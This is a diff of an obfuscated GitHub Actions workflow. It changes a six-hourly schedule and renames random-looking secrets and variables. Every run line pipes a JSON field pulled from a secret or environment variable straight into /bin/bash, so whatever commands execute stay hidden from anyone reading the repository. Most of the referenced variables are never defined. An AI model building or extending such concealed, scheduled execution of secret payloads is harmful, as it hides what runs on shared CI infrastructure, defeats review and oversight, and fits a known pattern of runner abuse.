@@ -3,8 +3,7 @@ name: zhengcunzai3456
 on:
   workflow_dispatch:
   schedule:
-    - cron: '50 1/6 * * *'
-
+    - cron: '36 4/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -12,17 +11,14 @@ jobs:
       - uses: actions/checkout@v4
       - name: zhengcunzai3456
         env:
-          a1968: ${{ secrets.a1968 }}
+          mi13047: ${{ secrets.mi13047 }}
         run: |
-          echo $a1968 | jq -r .vckar2 | /bin/bash
-          echo $mifxk5766 | jq -r .p7200 | /bin/bash
-          echo $xsefo26489 | jq -r .hmrd84 | /bin/bash
-          echo $zi30561 | jq -r .aif46 | /bin/bash
-          echo $dqu185 | jq -r .qdf98397 | /bin/bash
-          echo $wip1936 | jq -r .lys62589 | /bin/bash
-          echo $ix5 | jq -r .lgz51 | /bin/bash
-          echo $jhjwd39 | jq -r .eo14 | /bin/bash
-          echo $cp0 | jq -r .avbpd67 | /bin/bash
-          echo $rnyg747 | jq -r .wowg379 | /bin/bash
-          echo $hyyq26409 | jq -r .dxnw20744 | /bin/bash
+          echo $mi13047 | jq -r .c11 | /bin/bash
+          echo $w42886 | jq -r .km7 | /bin/bash
+          echo $ilq625 | jq -r .ruo332 | /bin/bash
+          echo $taxek2395 | jq -r .wb70 | /bin/bash
+          echo $rkavd92841 | jq -r .npa65392 | /bin/bash
+          echo $ghx5098 | jq -r .upnwh738 | /bin/bash
+          echo $j2214 | jq -r .v35 | /bin/bash
+          echo $clkcg383 | jq -r .j513 | /bin/bash
 
